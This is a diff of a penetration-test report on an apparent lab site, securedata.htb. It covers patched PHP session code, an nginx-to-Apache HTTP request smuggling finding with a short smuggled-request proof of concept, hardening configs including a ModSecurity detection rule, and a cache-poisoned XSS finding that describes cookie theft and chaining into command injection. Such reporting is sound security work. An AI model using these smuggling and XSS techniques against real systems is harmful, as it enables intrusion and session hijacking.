+   5. Regenerate session tokens on login and enforce short session lifetimes.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   Fixed code
+
+   1. db_schema.sql
+
+   Add an invalidated flag to the sessions table:
+
+   ```sql
+     CREATE TABLE `users` (
+       `id` int NOT NULL primary key AUTO_INCREMENT,
+       `username` TEXT NOT NULL,
+       `role` int NOT NULL,
+       `password` TEXT NOT NULL
+     );
+
+     CREATE TABLE `sessions` (
+       `id` int NOT NULL primary key AUTO_INCREMENT,
+       `token` TEXT NOT NULL,
+       `user_id` TEXT NOT NULL,
+       `invalidated` tinyint(1) NOT NULL DEFAULT 0,
+       `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
+     );
+
+     INSERT INTO `users` (`username`, `role`, `password`) VALUES
+     ('developer', 1, '$2a$12$hstCruIkPcUmcUBlE6lHYe23A3d6tqIAnpLBdAM/10B0Dk3LJqV/a');
+   ```
+
+   2. session.php
+
+   ```php
+     <?php
+     require_once dirname(__FILE__) . '/config.php';
+
+     function generate_session_token()
+     {
+         return bin2hex(random_bytes(32));
+     }
+
+     function create_session($user_id)
+     {
+         global $conn;
+
+         $token = generate_session_token();
+         $sql = "INSERT INTO sessions (token, user_id, invalidated) VALUES (?,?,0)";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "ss", $token, $user_id);
+         mysqli_stmt_execute($stmt);
+         return $token;
+     }
+
+     function destroy_session($token)
+     {
+         global $conn;
+
+         // Mark invalidated atomically instead of deleting
+         $sql = "UPDATE sessions SET invalidated=1 WHERE token=? AND invalidated=0";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "s", $token);
+         mysqli_stmt_execute($stmt);
+         return true;
+     }
+
+     function get_session_user($token)
+     {
+         global $conn;
+
+         $sql = "SELECT user_id FROM sessions WHERE token=? AND invalidated=0";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "s", $token);
+         mysqli_stmt_execute($stmt);
+         $result = mysqli_stmt_get_result($stmt);
+
+         if ($row = mysqli_fetch_assoc($result)) {
+             log_query();
+             return $row['user_id'];
+         }
+         return false;
+     }
+
+     function get_session_properties($token)
+     {
+         global $conn;
+
+         $user_id = intval(get_session_user($token));
+         if (!$user_id) {
+             return null;
+         }
+
+         $sql = "SELECT * FROM users WHERE id=?";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "i", $user_id);
+         mysqli_stmt_execute($stmt);
+         $result = mysqli_stmt_get_result($stmt);
+
+         if ($row = mysqli_fetch_assoc($result)) {
+             return $row;
+         }
+         return null;
+     }
+
+     function get_source_ip()
+     {
+         $ip = $_SERVER['REMOTE_ADDR'];
+         return $ip;
+     }
+
+     function log_query()
+     {
+         global $logfile;
+         global $log_url;
+         $ip = get_source_ip();
+         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+         $uri = $_SERVER['REQUEST_URI'];
+         $request_id = hash('sha256', $ip . $ua . $uri . time());
+
+         $params = array(
+             "ip" => $ip,
+             "ua" => $ua,
+             "uri" => $uri,
+             "id" => $request_id,
+         );
+         $ch = curl_init($log_url . "?" . http_build_query($params));
+         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+         curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+         curl_exec($ch);
+         curl_close($ch);
+
+         file_put_contents($logfile, "{$uri} - {$ua} - {$ip} (Request ID: {$request_id})\n", FILE_APPEND);
+     }
+
+     function query_sessions_by_user($username)
+     {
+         global $conn;
+
+         $username = "%{$username}%";
+         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND users.username LIKE ?";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "s", $username);
+         mysqli_stmt_execute($stmt);
+         $result = mysqli_stmt_get_result($stmt);
+
+         if ($result->num_rows === 0) {
+             return false;
+         }
+
+         log_query();
+         return $result;
+     }
+
+     function query_sessions_by_token($token)
+     {
+         global $conn;
+
+         $token = "%{$token}%";
+         $sql = "SELECT users.username, users.role, sessions.token FROM users, sessions WHERE users.id=sessions.user_id AND sessions.invalidated=0 AND sessions.token LIKE ?";
+         $stmt = mysqli_stmt_init($conn);
+         if (!mysqli_stmt_prepare($stmt, $sql)) {
+             echo "SQL Error";
+             exit();
+         }
+
+         mysqli_stmt_bind_param($stmt, "s", $token);
+         mysqli_stmt_execute($stmt);
+         $result = mysqli_stmt_get_result($stmt);
+
+         if ($result->num_rows === 0) {
+             return false;
+         }
+
+         log_query();
+         return $result;
+     }
+   ```
+
+   3. admin_panel.php
+
+   ```php
+     <?php
+     require_once '../common/session.php';
+
+     // check valid session
+     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
+         header("Location: /index.php");
+         exit();
+     }
+
+     // fetch user properties safely
+     $user = get_session_properties($_COOKIE["session"]);
+     if ($user === null || !isset($user["role"])) {
+         header("Location: /index.php");
+         exit();
+     }
+
+     // strict role check
+     $user_role = (int)$user["role"];
+     if ($user_role !== 0) {
+         header("Location: /home.php");
+         exit();
+     }
+   ```
+
+   Apply the same change to session_manager.php.
+
+   4. logout.php
+
+   ```php
+     <?php
+     require_once ('common/session.php');
+
+     if (!isset($_COOKIE["session"])) {
+         header("Location: /index.php");
+         exit();
+     }
+
+     $sessiontoken = $_COOKIE["session"];
+     destroy_session($sessiontoken);
+
+     // Clear the cookie on the client side as well
+     setcookie('session', '', [
+         'expires' => time() - 3600,
+         'path' => '/',
+         'secure' => true,
+         'httponly' => true,
+         'samesite' => 'Strict'
+     ]);
+
+     header("Location: /index.php");
+     exit();
+   ```
+
    ───────────────
 
 
@@ -5175,60 +5155,60 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (5.3 - Medium)
 
 #### Description & Cause
 
-   The application’s architecture places an nginx reverse proxy in front of an Apache back-end server. These two components interpret HTTP request boundaries differently, resulting in an   
-   HTTP request smuggling vulnerability. Specifically, the front-end nginx accepts a request with a Content-Length header and forwards it to the Apache back-end, which processes additional 
-   HTTP data appended inside the request body as a separate, smuggled request.                                                                                                               
-                                                                                                                                                                                             
-   In the observed proof-of-concept, the attacker sent a POST request to /errorsa.php with a body containing a complete second HTTP request:                                                 
-                                                                                                                                                                                             
-   ```                                                                                                                                                                                       
-     GET /service_status?service=apache2 HTTP/1.1                                                                                                                                            
-     Host: api.securedata.htb                                                                                                                                                                
-     ...                                                                                                                                                                                     
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Because of the desynchronization, nginx treated the entire payload as the body of the first request, while Apache interpreted the embedded payload as a new incoming request. The server  
-   returned two distinct responses:                                                                                                                                                          
-                                                                                                                                                                                             
-   1. 404 Not Found for the original POST /errorsa.php request, relayed from the Apache back-end at 127.0.0.1 Port 8000.                                                                     
-   2. 403 Forbidden for the smuggled GET /service_status?service=apache2 request.                                                                                                            
-                                                                                                                                                                                             
-   Receiving two separate responses for a single request proves that the back-end processed the embedded request independently from the original request. This allows an attacker to route   
-   requests to the internal back-end server and bypass front-end routing or access controls.                                                                                                 
-                                                                                                                                                                                             
-   Successful exploitation allows an attacker to send requests to internal endpoints that are not directly exposed. If combined with other vulnerabilities, such as the command-injection   
-   flaw in /service_status, this access could be leveraged for further attacks.                                                                                                              
-                                                                                                                                                                                             
-   Causes                                                                                                                                                                                    
-                                                                                                                                                                                             
-   1. Inconsistent request-length parsing                                                                                                                                                    
-      The front-end nginx and back-end Apache disagree on how to determine where one HTTP request ends and the next begins. When a request contains a Content-Length header and a body with  
-      embedded HTTP traffic, one server uses the header length while the other parses the remaining body as a new request.                                                                   
-                                                                                                                                                                                             
-   2. Front-end does not reject ambiguous requests                                                                                                                                           
-      nginx accepts requests whose body structure does not match the declared Content-Length and forwards them without normalization, validation, or rejection.                              
-                                                                                                                                                                                             
-   3. Back-end interprets body content as a new request                                                                                                                                      
-      Apache reads past the declared body length and treats the embedded HTTP request as a legitimate incoming request, allowing the smuggled request to be processed.                       
-                                                                                                                                                                                             
-   4. No request isolation between front-end and back-end                                                                                                                                    
-      The internal Apache back-end at 127.0.0.1:8000 trusts requests arriving through the front-end channel and exposes internal endpoints such as /service_status without additional        
-      authentication or network segmentation.                                                                                                                                                
-                                                                                                                                                                                             
-   5. Internal services reachable from the back-end                                                                                                                                          
-      The internal API (api.securedata.htb) is resolvable and reachable from the back-end server, so a smuggled request can be routed to it and trigger internal vulnerabilities.            
- 
+   The application’s architecture places an nginx reverse proxy in front of an Apache back-end server. These two components interpret HTTP request boundaries differently, resulting in an
+   HTTP request smuggling vulnerability. Specifically, the front-end nginx accepts a request with a Content-Length header and forwards it to the Apache back-end, which processes additional
+   HTTP data appended inside the request body as a separate, smuggled request.
+
+   In the observed proof-of-concept, the attacker sent a POST request to /errorsa.php with a body containing a complete second HTTP request:
+
+   ```
+     GET /service_status?service=apache2 HTTP/1.1
+     Host: api.securedata.htb
+     ...
+   ```
+
+   Because of the desynchronization, nginx treated the entire payload as the body of the first request, while Apache interpreted the embedded payload as a new incoming request. The server
+   returned two distinct responses:
+
+   1. 404 Not Found for the original POST /errorsa.php request, relayed from the Apache back-end at 127.0.0.1 Port 8000.
+   2. 403 Forbidden for the smuggled GET /service_status?service=apache2 request.
+
+   Receiving two separate responses for a single request proves that the back-end processed the embedded request independently from the original request. This allows an attacker to route
+   requests to the internal back-end server and bypass front-end routing or access controls.
+
+   Successful exploitation allows an attacker to send requests to internal endpoints that are not directly exposed. If combined with other vulnerabilities, such as the command-injection
+   flaw in /service_status, this access could be leveraged for further attacks.
+
+   Causes
+
+   1. Inconsistent request-length parsing
+      The front-end nginx and back-end Apache disagree on how to determine where one HTTP request ends and the next begins. When a request contains a Content-Length header and a body with
+      embedded HTTP traffic, one server uses the header length while the other parses the remaining body as a new request.
+
+   2. Front-end does not reject ambiguous requests
+      nginx accepts requests whose body structure does not match the declared Content-Length and forwards them without normalization, validation, or rejection.
+
+   3. Back-end interprets body content as a new request
+      Apache reads past the declared body length and treats the embedded HTTP request as a legitimate incoming request, allowing the smuggled request to be processed.
+
+   4. No request isolation between front-end and back-end
+      The internal Apache back-end at 127.0.0.1:8000 trusts requests arriving through the front-end channel and exposes internal endpoints such as /service_status without additional
+      authentication or network segmentation.
+
+   5. Internal services reachable from the back-end
+      The internal API (api.securedata.htb) is resolvable and reachable from the back-end server, so a smuggled request can be routed to it and trigger internal vulnerabilities.
+
 
 
 #### Security Impact
 
-   1. Bypass of front-end access controls                                                                                                                                                    
+   1. Bypass of front-end access controls
       HTTP request smuggling allows an attacker to bypass routing rules, IP restrictions, and Web Application Firewall (WAF) protections enforced by the nginx front-end. Requests that would
-      normally be blocked or routed elsewhere are processed directly by the Apache back-end.                                                                                                 
-                                                                                                                                                                                             
-   2. Access to internal endpoints                                                                                                                                                           
-      Because the smuggled request is processed by the internal back-end at 127.0.0.1:8000, the attacker can reach endpoints such as /service_status on api.securedata.htb that are not      
-      directly exposed to external users.                                                                                                                                                    
+      normally be blocked or routed elsewhere are processed directly by the Apache back-end.
+
+   2. Access to internal endpoints
+      Because the smuggled request is processed by the internal back-end at 127.0.0.1:8000, the attacker can reach endpoints such as /service_status on api.securedata.htb that are not
+      directly exposed to external users.
 
    3. Potential for further attacks when chained with other vulnerabilities
       Reaching an internal endpoint such as /service_status increases attack surface. If a separate vulnerability exists on that endpoint, the smuggled access path could be used to escalate
@@ -5301,8 +5281,8 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (5.3 - Medium)
    ```
 
    This is the response to the smuggled GET /service\_status?service=apache2 request.
-   
-![](assets/edited-bcNe39Lk.png){width="auto"}
+
+![bcNe39Lk](assets/edited-bcNe39Lk.png)
    This indicates that the connection state became desynchronized after the smuggled request was processed.
 
 4. Interpret the result. Receiving more than one HTTP response for a single request proves that the front-end nginx and back-end Apache disagree on request boundaries. The back-end processed the embedded request independently from the original request, confirming HTTP request smuggling.
@@ -5310,166 +5290,166 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (5.3 - Medium)
 
 #### Patching and Remediation
 
-   1. Reject ambiguous requests at the front-end                                                                                                                                             
-                                                                                                                                                                                             
-   Configure nginx to reject any request that contains both Content-Length and Transfer-Encoding headers, or any request with malformed framing. This prevents CL.TE and TE.CL desync        
-   attacks.                                                                                                                                                                                  
-                                                                                                                                                                                             
-   nginx configuration:                                                                                                                                                                      
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     server {                                                                                                                                                                                
-         listen 80;                                                                                                                                                                          
-         server_name securedata.htb;                                                                                                                                                         
-                                                                                                                                                                                             
-         location / {                                                                                                                                                                        
-             # Reject requests with both Content-Length and Transfer-Encoding                                                                                                                
-             if ($http_transfer_encoding) {                                                                                                                                                  
-                 return 400;                                                                                                                                                                 
-             }                                                                                                                                                                               
-                                                                                                                                                                                             
-             proxy_pass http://backend;                                                                                                                                                      
-             proxy_http_version 1.1;                                                                                                                                                         
-             proxy_set_header Connection "";                                                                                                                                                 
-         }                                                                                                                                                                                   
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   For a more robust solution, use a Web Application Firewall (WAF) rule that drops requests with conflicting request-length headers.                                                        
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   2. Normalize request framing                                                                                                                                                              
-                                                                                                                                                                                             
-   Ensure that the front-end normalizes or strips Transfer-Encoding before forwarding to the back-end, and always uses a single, unambiguous mechanism for determining request length.       
-                                                                                                                                                                                             
-   nginx configuration:                                                                                                                                                                      
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     location / {                                                                                                                                                                            
-         proxy_pass http://backend;                                                                                                                                                          
-         proxy_http_version 1.1;                                                                                                                                                             
-         proxy_set_header Connection "";                                                                                                                                                     
-                                                                                                                                                                                             
-         # Do not forward Transfer-Encoding blindly                                                                                                                                          
-         proxy_set_header Transfer-Encoding "";                                                                                                                                              
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   3. Harden Apache back-end parsing                                                                                                                                                         
-                                                                                                                                                                                             
-   Apache 2.4.53 and later supports HttpProtocolOptions Strict, which rejects ambiguous HTTP requests and helps prevent smuggling.                                                           
-                                                                                                                                                                                             
-   Apache configuration (apache2.conf or virtual host):                                                                                                                                      
-                                                                                                                                                                                             
-   ```apache                                                                                                                                                                                 
-     HttpProtocolOptions Strict                                                                                                                                                              
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   This instructs Apache to reject requests with malformed or ambiguous request-line and header syntax.                                                                                      
-                                                                                                                                                                                             
-   Also ensure mod_reqtimeout is enabled to limit slow or malformed requests:                                                                                                                
-                                                                                                                                                                                             
-   ```apache                                                                                                                                                                                 
-     RequestReadTimeout header=20-40,MinRate=500body=20,MinRate=500                                                                                                                          
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   4. Use HTTP/2 end-to-end                                                                                                                                                                  
-                                                                                                                                                                                             
-   HTTP/2 uses a binary framing layer that is far less susceptible to request smuggling. If both front-end and back-end support HTTP/2, configure the connection to use HTTP/2 exclusively   
-   and avoid downgrading to HTTP/1.1.                                                                                                                                                        
-                                                                                                                                                                                             
-   nginx configuration:                                                                                                                                                                      
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     server {                                                                                                                                                                                
-         listen 443 ssl http2;                                                                                                                                                               
-         server_name securedata.htb;                                                                                                                                                         
-                                                                                                                                                                                             
-         location / {                                                                                                                                                                        
-             proxy_pass http://backend;                                                                                                                                                      
-             proxy_http_version 2.0;                                                                                                                                                         
-         }                                                                                                                                                                                   
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   │ Note: Do not downgrade HTTP/2 traffic to HTTP/1.1 before forwarding, as this reintroduces smuggling risks.                                                                              
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   5. Disable connection reuse between front-end and back-end                                                                                                                                
-                                                                                                                                                                                             
-   If connection reuse is not required, force nginx to open a new back-end connection for each request. This limits the impact of a successful desync because smuggled requests cannot be    
-   chained on reused connections.                                                                                                                                                            
-                                                                                                                                                                                             
-   nginx configuration:                                                                                                                                                                      
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     location / {                                                                                                                                                                            
-         proxy_pass http://backend;                                                                                                                                                          
-         proxy_http_version 1.1;                                                                                                                                                             
-         proxy_set_header Connection "close";                                                                                                                                                
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   6. Consistent server stack and parsing behavior                                                                                                                                           
-                                                                                                                                                                                             
-   Request smuggling often arises when two different HTTP parsers interpret ambiguous requests differently. Where possible:                                                                  
-                                                                                                                                                                                             
-   • Use the same HTTP server technology for front-end and back-end, or                                                                                                                      
-   • Ensure both servers are configured to use identical request-length semantics.                                                                                                           
-   • Regularly update both nginx and Apache to the latest stable versions.                                                                                                                   
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   7. Segment internal APIs                                                                                                                                                                  
-                                                                                                                                                                                             
-   The internal API (api.securedata.htb) should not be reachable from the public-facing back-end server.                                                                                     
-                                                                                                                                                                                             
-   • Place internal services on a separate network segment.                                                                                                                                  
-   • Require authentication for all internal API requests.                                                                                                                                   
-   • Block direct resolution or routing to api.securedata.htb from the public web tier.                                                                                                      
-   • Do not rely on CLIENT-IP or X-Forwarded-For headers for access control unless they are explicitly validated against a trusted source.                                                   
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   8. Validate internal-source headers                                                                                                                                                       
-                                                                                                                                                                                             
-   Do not trust CLIENT-IP: 127.0.0.1 or X-Forwarded-For: 127.0.0.1 to grant access. If internal endpoints require IP-based restrictions, enforce them at the network layer or validate       
-   headers against a whitelist of trusted front-end proxies.                                                                                                                                 
-                                                                                                                                                                                             
-   ```nginx                                                                                                                                                                                  
-     # Example: only allow internal API access from the front-end proxy                                                                                                                      
-     location /service_status {                                                                                                                                                              
-         allow 10.0.0.0/8;                                                                                                                                                                   
-         deny all;                                                                                                                                                                           
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   9. Deploy detection and monitoring                                                                                                                                                        
-                                                                                                                                                                                             
-   Log and alert on patterns indicative of request smuggling:                                                                                                                                
-                                                                                                                                                                                             
-   • Requests containing both Content-Length and Transfer-Encoding.                                                                                                                          
-   • Requests with malformed Content-Length values.                                                                                                                                          
-   • Multiple HTTP responses returned for a single client request.                                                                                                                           
-   • Unexpected internal API requests originating from the web tier.                                                                                                                         
-                                                                                                                                                                                             
-   Example ModSecurity rule:                                                                                                                                                                 
-                                                                                                                                                                                             
-   ```apache                                                                                                                                                                                 
-     SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ." \                                                                                                                                     
-         "id:1000,phase:1,deny,status:400,msg:'Transfer-Encoding header not allowed'"                                                                                                        
-   ```                                                                                                                                                                                       
-                                                                                         
+   1. Reject ambiguous requests at the front-end
+
+   Configure nginx to reject any request that contains both Content-Length and Transfer-Encoding headers, or any request with malformed framing. This prevents CL.TE and TE.CL desync
+   attacks.
+
+   nginx configuration:
+
+   ```nginx
+     server {
+         listen 80;
+         server_name securedata.htb;
+
+         location / {
+             # Reject requests with both Content-Length and Transfer-Encoding
+             if ($http_transfer_encoding) {
+                 return 400;
+             }
+
+             proxy_pass http://backend;
+             proxy_http_version 1.1;
+             proxy_set_header Connection "";
+         }
+     }
+   ```
+
+   For a more robust solution, use a Web Application Firewall (WAF) rule that drops requests with conflicting request-length headers.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   2. Normalize request framing
+
+   Ensure that the front-end normalizes or strips Transfer-Encoding before forwarding to the back-end, and always uses a single, unambiguous mechanism for determining request length.
+
+   nginx configuration:
+
+   ```nginx
+     location / {
+         proxy_pass http://backend;
+         proxy_http_version 1.1;
+         proxy_set_header Connection "";
+
+         # Do not forward Transfer-Encoding blindly
+         proxy_set_header Transfer-Encoding "";
+     }
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   3. Harden Apache back-end parsing
+
+   Apache 2.4.53 and later supports HttpProtocolOptions Strict, which rejects ambiguous HTTP requests and helps prevent smuggling.
+
+   Apache configuration (apache2.conf or virtual host):
+
+   ```apache
+     HttpProtocolOptions Strict
+   ```
+
+   This instructs Apache to reject requests with malformed or ambiguous request-line and header syntax.
+
+   Also ensure mod_reqtimeout is enabled to limit slow or malformed requests:
+
+   ```apache
+     RequestReadTimeout header=20-40,MinRate=500body=20,MinRate=500
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   4. Use HTTP/2 end-to-end
+
+   HTTP/2 uses a binary framing layer that is far less susceptible to request smuggling. If both front-end and back-end support HTTP/2, configure the connection to use HTTP/2 exclusively
+   and avoid downgrading to HTTP/1.1.
+
+   nginx configuration:
+
+   ```nginx
+     server {
+         listen 443 ssl http2;
+         server_name securedata.htb;
+
+         location / {
+             proxy_pass http://backend;
+             proxy_http_version 2.0;
+         }
+     }
+   ```
+
+   │ Note: Do not downgrade HTTP/2 traffic to HTTP/1.1 before forwarding, as this reintroduces smuggling risks.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   5. Disable connection reuse between front-end and back-end
+
+   If connection reuse is not required, force nginx to open a new back-end connection for each request. This limits the impact of a successful desync because smuggled requests cannot be
+   chained on reused connections.
+
+   nginx configuration:
+
+   ```nginx
+     location / {
+         proxy_pass http://backend;
+         proxy_http_version 1.1;
+         proxy_set_header Connection "close";
+     }
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   6. Consistent server stack and parsing behavior
+
+   Request smuggling often arises when two different HTTP parsers interpret ambiguous requests differently. Where possible:
+
+   • Use the same HTTP server technology for front-end and back-end, or
+   • Ensure both servers are configured to use identical request-length semantics.
+   • Regularly update both nginx and Apache to the latest stable versions.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   7. Segment internal APIs
+
+   The internal API (api.securedata.htb) should not be reachable from the public-facing back-end server.
+
+   • Place internal services on a separate network segment.
+   • Require authentication for all internal API requests.
+   • Block direct resolution or routing to api.securedata.htb from the public web tier.
+   • Do not rely on CLIENT-IP or X-Forwarded-For headers for access control unless they are explicitly validated against a trusted source.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   8. Validate internal-source headers
+
+   Do not trust CLIENT-IP: 127.0.0.1 or X-Forwarded-For: 127.0.0.1 to grant access. If internal endpoints require IP-based restrictions, enforce them at the network layer or validate
+   headers against a whitelist of trusted front-end proxies.
+
+   ```nginx
+     # Example: only allow internal API access from the front-end proxy
+     location /service_status {
+         allow 10.0.0.0/8;
+         deny all;
+     }
+   ```
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   9. Deploy detection and monitoring
+
+   Log and alert on patterns indicative of request smuggling:
+
+   • Requests containing both Content-Length and Transfer-Encoding.
+   • Requests with malformed Content-Length values.
+   • Multiple HTTP responses returned for a single client request.
+   • Unexpected internal API requests originating from the web tier.
+
+   Example ModSecurity rule:
+
+   ```apache
+     SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ." \
+         "id:1000,phase:1,deny,status:400,msg:'Transfer-Encoding header not allowed'"
+   ```
+
 
 
 ### XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning  {#9d9448f8-0a56-4e7d-ab86-82a1e6410844}
@@ -5494,236 +5474,240 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N (7.0 - High)
 
 #### Description & Cause
 
-The application reflects the value of the Client-IP request header directly into the HTTP response body without adequate input validation or output encoding. The upstream caching layer  
-   additionally caches responses based on the Client-IP header value, storing each unique header value as a distinct cached response for approximately five minutes.                         
-                                                                                                                                                                                             
-   An attacker can send a request to the affected endpoint (e.g., /admin/admin_panel.php) with a malicious Client-IP header containing an XSS payload. The cache stores the poisoned response and   
-   subsequently serves it to any user — including authenticated administrators — who requests the same page while the cached entry remains valid. When the victim’s browser renders the      
-   cached response, the embedded JavaScript executes in the context of the victim’s session, enabling theft of session cookies and other authenticated actions.                              
-                                                                                                                                                                                             
-   Causes                                                                                                                                                                                    
-                                                                                                                                                                                             
-   1. Unvalidated input reflection                                                                                                                                                           
-      The application reads the Client-IP request header and writes it into the response without validating that it contains a legitimate IP address or safe characters.                     
-                                                                                                                                                                                             
-   2. Missing output encoding                                                                                                                                                                
-      The reflected header value is not HTML-entity-encoded, JavaScript-escaped, or otherwise sanitized before being rendered, allowing script tags and event handlers to execute.           
-                                                                                                                                                                                             
-   3. Unsafe cache keying                                                                                                                                                                    
+The application reflects the value of the Client-IP request header directly into the HTTP response body without adequate input validation or output encoding. The upstream caching layer
+   additionally caches responses based on the Client-IP header value, storing each unique header value as a distinct cached response for approximately five minutes.
+
+   An attacker can send a request to the affected endpoint (e.g., /admin/admin_panel.php) with a malicious Client-IP header containing an XSS payload. The cache stores the poisoned response and
+   subsequently serves it to any user — including authenticated administrators — who requests the same page while the cached entry remains valid. When the victim’s browser renders the
+   cached response, the embedded JavaScript executes in the context of the victim’s session, enabling theft of session cookies and other authenticated actions.
+
+   Causes
+
+   1. Unvalidated input reflection
+      The application reads the Client-IP request header and writes it into the response without validating that it contains a legitimate IP address or safe characters.
+
+   2. Missing output encoding
+      The reflected header value is not HTML-entity-encoded, JavaScript-escaped, or otherwise sanitized before being rendered, allowing script tags and event handlers to execute.
+
+   3. Unsafe cache keying
       The cache keys responses on the attacker-controllable Client-IP header. This allows one user to influence the cached response delivered to other users, converting a reflected XSS into
-      a stored/cache-persistent XSS.                                                                                                                                                         
-                                                                                                                                                                                             
-   4. No cache input normalization                                                                                                                                                           
-      The caching layer does not strip or normalize potentially dangerous headers before storing the response, nor does it validate that reflected content is safe to cache.                 
-                                                                                                                                                                                             
-   5. Insufficient cache isolation                                                                                                                                                           
-      Responses containing user-controlled dynamic content are cached globally rather than marked as non-cacheable or keyed only on safe, non-attacker-controlled parameters. 
+      a stored/cache-persistent XSS.
+
+   4. No cache input normalization
+      The caching layer does not strip or normalize potentially dangerous headers before storing the response, nor does it validate that reflected content is safe to cache.
+
+   5. Insufficient cache isolation
+      Responses containing user-controlled dynamic content are cached globally rather than marked as non-cacheable or keyed only on safe, non-attacker-controlled parameters.
 
 #### Security Impact
 
-   1. Session hijacking via cookie theft                                                                                                                                                     
-      Because the XSS payload executes in the victim’s browser origin, it can read non-HttpOnly session cookies and exfiltrate them to the attacker. With a stolen session token, the        
-      attacker can impersonate the victim and access the application as an authenticated user.                                                                                               
-                                                                                                                                                                                             
-   2. Forced actions on behalf of the victim                                                                                                                                                 
-      The attacker-controlled JavaScript can issue arbitrary HTTP requests from the victim’s browser using the victim’s session. This allows the attacker to:                                
-       • Perform administrative actions without the victim’s consent.                                                                                                                        
-       • Read sensitive data accessible to the victim.                                                                                                                                       
-       • Modify account settings, permissions, or application data.                                                                                                                          
-       • Submit forms or invoke API endpoints as the victim.                                                                                                                                 
-                                                                                                                                                                                             
-   3. Pivot to internal services                                                                                                                                                             
-      If the victim has access to internal or restricted endpoints (e.g., api.securedata.htb), the attacker can use the compromised browser as a proxy to enumerate and attack those         
-      resources. In this case, the attacker leveraged the victim’s session to reach /fetch_logs, /fetch_sysinfo, and /service_status, ultimately achieving remote code execution through the 
-      command-injection flaw in the service parameter.                                                                                                                                       
-                                                                                                                                                                                             
-   4. Administrative compromise                                                                                                                                                              
-      Because the target victim is an administrator, successful exploitation grants the attacker the same privileges within the application, leading to full compromise of the web           
-      application and potentially the underlying infrastructure.   
+   1. Session hijacking via cookie theft
+      Because the XSS payload executes in the victim’s browser origin, it can read non-HttpOnly session cookies and exfiltrate them to the attacker. With a stolen session token, the
+      attacker can impersonate the victim and access the application as an authenticated user.
+
+   2. Forced actions on behalf of the victim
+      The attacker-controlled JavaScript can issue arbitrary HTTP requests from the victim’s browser using the victim’s session. This allows the attacker to:
+       • Perform administrative actions without the victim’s consent.
+       • Read sensitive data accessible to the victim.
+       • Modify account settings, permissions, or application data.
+       • Submit forms or invoke API endpoints as the victim.
+
+   3. Pivot to internal services
+      If the victim has access to internal or restricted endpoints (e.g., api.securedata.htb), the attacker can use the compromised browser as a proxy to enumerate and attack those
